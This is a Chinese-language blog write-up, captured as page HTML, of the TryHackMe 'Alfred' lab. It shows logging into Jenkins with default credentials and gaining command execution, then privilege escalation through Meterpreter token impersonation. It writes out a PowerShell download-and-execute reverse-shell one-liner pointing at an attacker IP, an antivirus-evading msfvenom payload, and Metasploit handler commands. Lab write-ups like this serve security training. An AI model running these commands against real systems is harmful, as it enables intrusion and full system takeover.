@@ -1,0 +1,423 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>打靶记录(一)之THMAlfred | MikannseのSekai</title><meta name="author" content="Mikannse"><meta name="copyright" content="Mikannse"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Initial Accessnmap扫描端口  浏览器访问8080端口的web服务，发现是一个Jenkins CMS  尝试admin admin 成功登录 也可以用hydra爆破,这里贴一张网上的WP图  稍微在网上搜索下这个比较经典的CMS，就可以知道这有个页面可以上我们RCE   https:&#x2F;&#x2F;github.com&#x2F;samratashok&#x2F;nishang 利用这其中的Invoke-Powe">
+<meta property="og:type" content="article">
+<meta property="og:title" content="打靶记录(一)之THMAlfred">
+<meta property="og:url" content="http://mikannse.space/2023/06/27/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80)%E4%B9%8BTHM%20%C2%96Alfred/index.html">
+<meta property="og:site_name" content="MikannseのSekai">
+<meta property="og:description" content="Initial Accessnmap扫描端口  浏览器访问8080端口的web服务，发现是一个Jenkins CMS  尝试admin admin 成功登录 也可以用hydra爆破,这里贴一张网上的WP图  稍微在网上搜索下这个比较经典的CMS，就可以知道这有个页面可以上我们RCE   https:&#x2F;&#x2F;github.com&#x2F;samratashok&#x2F;nishang 利用这其中的Invoke-Powe">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg">
+<meta property="article:published_time" content="2023-06-27T09:19:27.000Z">
+<meta property="article:modified_time" content="2023-06-27T09:47:32.292Z">
+<meta property="article:author" content="Mikannse">
+<meta property="article:tag" content="网安">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="windows">
+<meta property="article:tag" content="打靶">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg"><link rel="shortcut icon" href="/img/icon.jpg"><link rel="canonical" href="http://mikannse.space/2023/06/27/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80)%E4%B9%8BTHM%20%C2%96Alfred/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Mikannse","link":"链接: ","source":"来源: MikannseのSekai","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '打靶记录(一)之THMAlfred',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: undefined,
+  isToc: true,
+  postUpdate: '2023-06-27 17:47:32'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (true) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">274</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="MikannseのSekai"><span class="site-name">MikannseのSekai</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">打靶记录(一)之THMAlfred</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-06-27T09:19:27.000Z" title="发表于 2023-06-27 17:19:27">2023-06-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-27T09:47:32.292Z" title="更新于 2023-06-27 17:47:32">2023-06-27</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E5%AE%89/">网安</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>4分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="打靶记录(一)之THMAlfred"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Initial-Access"><a href="#Initial-Access" class="headerlink" title="Initial Access"></a>Initial Access</h1><p>nmap扫描端口</p>
+<p><img src="/images/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80)%E4%B9%8BTHM%C2%96Alfred/image-20230619225046648.png"></p>
+<p>浏览器访问8080端口的web服务，发现是一个Jenkins CMS</p>
+<p><img src="/images/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80)%E4%B9%8BTHM%C2%96Alfred/image-20230619225058139.png"></p>
+<p>尝试admin admin 成功登录</p>
+<p>也可以用hydra爆破,这里贴一张网上的WP图</p>
+<p><img src="/images/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80)%E4%B9%8BTHM%C2%96Alfred/111.png"></p>
+<p>稍微在网上搜索下这个比较经典的CMS，就可以知道这有个页面可以上我们RCE</p>
+<p><img src="/images/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80)%E4%B9%8BTHM%C2%96Alfred/image-20230620014946527.png"></p>
+<p><img src="/images/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80)%E4%B9%8BTHM%C2%96Alfred/image-20230620015054066.png"></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p>
+<p>利用这其中的<em>Invoke-PowerShellTcp.ps1</em>来进行反向shell</p>
+<p>在本地开启Python服务来让靶机下载我们的shell,开启nc来监听反向shell</p>
+<p><img src="/images/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80)%E4%B9%8BTHM%C2%96Alfred/image-20230620020854770.png"></p>
+<p><img src="/images/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80)%E4%B9%8BTHM%C2%96Alfred/image-20230620020906140.png"></p>
+<p>在靶机上，用powershell脚本来进行反向shell的下载与连接，IP为自己攻击机的IP，</p>
+<p>powershell iex (New-Object Net.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="http://10.17.49.170:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp">http://10.17.49.170:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp</a> -Reverse -IPAddress 10.17.49.170 -Port 1234</p>
+<p><img src="/images/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80)%E4%B9%8BTHM%C2%96Alfred/image-20230620023004471.png"></p>
+<p>apply,save,build now来运行powershell</p>
+<p><img src="/images/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80)%E4%B9%8BTHM%C2%96Alfred/image-20230620023038616.png"></p>
+<p>连了好几次终于连上去了</p>
+<p><img src="/images/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80)%E4%B9%8BTHM%C2%96Alfred/image-20230620023115938.png"></p>
+<h1 id="Switching-Shells"><a href="#Switching-Shells" class="headerlink" title="Switching Shells"></a>Switching Shells</h1><p>为了使权限升级更容易，让我们使用以下过程切换到meterpreter shell。</p>
+<p>使用msfvenom创建一个Windows meterpreter reverse shell，并使用以下有效负载：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe</span><br></pre></td></tr></tbody></table></figure>
+
+<p>该有效载荷生成编码的x86-64反向TCP计量器有效载荷。有效载荷通常被编码以确保它们被正确地传输，并且还逃避防病毒产品。反病毒产品可能无法识别有效负载，也不会将其标记为恶意。</p>
+<p>创建此有效负载后，使用与上一步相同的方法将其下载到计算机：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">powershell "(New-Object System.Net.WebClient).Downloadfile('http://your-thm-ip:8000/shell-name.exe','shell-name.exe')"</span><br></pre></td></tr></tbody></table></figure>
+
+
+<p>在运行此程序之前，请确保在Metasploit中设置了处理程序：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">use exploit/multi/handler  </span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp </span><br><span class="line">set LHOST your-thm-ip set LPORT listening-port run</span><br></pre></td></tr></tbody></table></figure>
+
+
+<p>这一步使用Metasploit处理程序接收来自反向shell的传入连接。一旦这个运行，输入这个命令来启动反向shell</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Start-Process "shell-name.exe"</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/images/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80)%E4%B9%8BTHM%C2%96Alfred/image-20230627155841777.png"></p>
+<p>发现shell成功上传</p>
+<p><img src="/images/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80)%E4%B9%8BTHM%C2%96Alfred/image-20230627163605363.png"></p>
+<p>这里的两个shell都是我传的，一开始以为是生成的参数填错了又传了个新的，后来才发现是没有设置payload（恼）</p>
+<p>在msf里开启监听</p>
+<p><img src="/images/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80)%E4%B9%8BTHM%C2%96Alfred/image-20230627160823365.png"></p>
+<p>草，连了半天连接失败才发现没有设置payload！！！</p>
+<p>set PAYLOAD windows/meterpreter/reverse_tcp</p>
+<p>在nc的shell中运行</p>
+<p>Start -Process “shell-name1.exe”</p>
+<p><img src="/images/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80)%E4%B9%8BTHM%C2%96Alfred/image-20230627163522605.png"></p>
+<p>成功将shell转移至msf</p>
+<h1 id="权限升级"><a href="#权限升级" class="headerlink" title="权限升级"></a>权限升级</h1><p>Windows使用令牌来确保帐户具有执行特定操作的正确权限。帐户令牌是在用户登录或通过身份验证时分配给帐户的。这通常是由LSASS.exe完成的（可以把这看作是一个身份验证过程）。</p>
+<p>此访问令牌包括：</p>
+<ul>
+<li>用户SID（安全标识符）</li>
+<li>组SID</li>
+<li>Privileges权限</li>
+</ul>
+<p>有两种类型的访问令牌：</p>
+<ul>
+<li>主要访问令牌：与登录时生成的用户帐户相关联的</li>
+<li>模拟令牌：这些允许特定进程（或进程中的线程）使用另一个（用户/客户端）进程的令牌来获得对资源的访问</li>
+</ul>
+<p>对于模拟令牌，有不同的级别：</p>
+<ul>
+<li>安全匿名：当前用户/客户端无法模拟另一个用户/客户端</li>
+<li>安全标识：当前用户/客户端可以获取客户端的标识和权限，但不能模拟客户端</li>
+<li>安全模拟：当前用户/客户端 可以在本地系统上模拟客户端的安全上下文</li>
+<li>安全授权：当前用户/客户端可以在远程系统上模拟客户端的安全上下文</li>
+</ul>
+<p>其中安全上下文是包含用户的相关安全信息的数据结构。</p>
+<p>帐户的权限（在创建时赋予帐户或从组继承）允许用户执行特定操作。以下是最常被滥用的特权：</p>
+<ul>
+<li>SeImpersonatePrivilege</li>
+<li>SeAssignPrimaryPrivilege</li>
+<li>SeTcbPrivilegesedbprivilege相关</li>
+<li>SeBackupPrivilegeSeBackupPrivilege服务</li>
+<li>SeRestorePrivilege返回特权</li>
+<li>SeCreateTokenPrivilege</li>
+<li>SeLoadDriverPrivilege</li>
+<li>SeTakeOwnershipPrivilege</li>
+<li>SeDebugPrivilege</li>
+</ul>
+<p>先用whoami /privc查看权限</p>
+<p>不知道为什么msf建立的shell提示没有whoami这个命令，在nc中建立的shell就有、、、</p>
+<p>得知有这些权限,按THM的思路来走利用SeImpersonatePrivilege权限，可以模拟别的用户的token</p>
+<p><img src="/images/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80)%E4%B9%8BTHM%C2%96Alfred/image-20230627164547298.png"></p>
+<p>在msf中输入load incognito载入incognito模块</p>
+<p><img src="/images/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80)%E4%B9%8BTHM%C2%96Alfred/image-20230627171054851.png"></p>
+<p>在 Windows 操作系统中，用户 token 是一个包含用户安全性标识符 (SID)、用户组 SID、用户特权和其他安全信息的数据结构。用户 token 通常与登录用户的安全身份相关联，可以用于验证用户对系统资源的访问权限。</p>
+<p>输入list_tokens -g查找有哪些可用的token</p>
+<p><img src="/images/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80)%E4%B9%8BTHM%C2%96Alfred/image-20230627165015272.png"></p>
+<p>发现BUILTIN\Administrators可用</p>
+<p>输入运行： <em>impersonate_token “BUILTIN\Administrators”</em></p>
+<p>来模拟Administrators的令牌</p>
+<p>即使拥有更高的特权令牌，也可能没有特权用户的权限（这是由于Windows处理权限的方式-它使用进程的主令牌而不是模拟令牌来确定进程可以或不能执行的操作）。 </p>
+<p>输入getuid，发现已经成功转换为SYSTEM组</p>
+<p><img src="/images/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80)%E4%B9%8BTHM%C2%96Alfred/image-20230627165341989.png"></p>
+<p>确保您迁移到具有正确权限的进程。最安全的进程是services.exe进程。首先，使用ps命令查看进程并查找services.exe进程的PID。使用migrate PID-OF-PROCESS命令迁移到此进程</p>
+<p>这里不太懂，问了下GPT</p>
+<p><img src="/images/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80)%E4%B9%8BTHM%C2%96Alfred/image-20230627170349867.png"></p>
+<p><img src="/images/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80)%E4%B9%8BTHM%C2%96Alfred/image-20230627165432369.png"></p>
+<p>最后cd至<strong>C:\Windows\System32\config</strong></p>
+<p>cat root.txt</p>
+<p>这里的cat能用应该是在msf中连接shell的原因…</p>
+<p>dff0f748678f280250f25a45b8046b4a</p>
+<h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p>虽然在THM中学完了windows提权，但还是第一次打包含windows提权的靶机，相对于Linux提权来说还不是很熟，如果没有THM的提示很多东西都不清楚，感觉还是知识上的缺漏，总之多打靶机()</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://mikannse.space">Mikannse</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://mikannse.space/2023/06/27/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80)%E4%B9%8BTHM%20%C2%96Alfred/">http://mikannse.space/2023/06/27/打靶记录(一)之THM Alfred/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://mikannse.space" target="_blank">MikannseのSekai</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BD%91%E5%AE%89/">网安</a><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><a class="post-meta__tags" href="/tags/windows/">windows</a><a class="post-meta__tags" href="/tags/%E6%89%93%E9%9D%B6/">打靶</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/06/29/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%BA%8C)%E4%B9%8BTHMhackpark/" title="打靶记录(二)之THMhackpark"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">打靶记录(二)之THMhackpark</div></div></a></div><div class="next-post pull-right"><a href="/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E7%9A%84%E7%AE%80%E5%8D%95%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" title="记一次对钓鱼网站的简单渗透测试"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">记一次对钓鱼网站的简单渗透测试</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/08/18/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%89%E4%BA%8C)%E4%B9%8BTHMRetro/" title="打靶记录(三二)之THMRetro"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-18</div><div class="title">打靶记录(三二)之THMRetro</div></div></a></div><div><a href="/2023/06/29/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%BA%8C)%E4%B9%8BTHMhackpark/" title="打靶记录(二)之THMhackpark"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-29</div><div class="title">打靶记录(二)之THMhackpark</div></div></a></div><div><a href="/2023/08/09/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%BA%8C%E4%B9%9D)%E4%B9%8BTHMRa2/" title="打靶记录(二九)之THMRa2"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-09</div><div class="title">打靶记录(二九)之THMRa2</div></div></a></div><div><a href="/2023/08/08/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%BA%8C%E5%85%AB)%E4%B9%8BTHMRa/" title="打靶记录(二八)之THMRa"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-08</div><div class="title">打靶记录(二八)之THMRa</div></div></a></div><div><a href="/2023/08/01/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%BA%8C%E5%9B%9B)%E4%B9%8BTHMYearofOwl/" title="打靶记录(二四)之THMYearofOwl"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-01</div><div class="title">打靶记录(二四)之THMYearofOwl</div></div></a></div><div><a href="/2023/10/21/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%BA%94%E4%B8%89)%E4%B9%8B%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Brute4Road/" title="打靶记录(五三)之春秋云境Brute4Road"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-21</div><div class="title">打靶记录(五三)之春秋云境Brute4Road</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Mikannse</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">274</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/mikannse/mikannse.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">暂时没有公告QAQ</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Initial-Access"><span class="toc-number">1.</span> <span class="toc-text">Initial Access</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Switching-Shells"><span class="toc-number">2.</span> <span class="toc-text">Switching Shells</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E5%8D%87%E7%BA%A7"><span class="toc-number">3.</span> <span class="toc-text">权限升级</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A2%8E%E7%A2%8E%E5%BF%B5"><span class="toc-number">4.</span> <span class="toc-text">碎碎念</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas 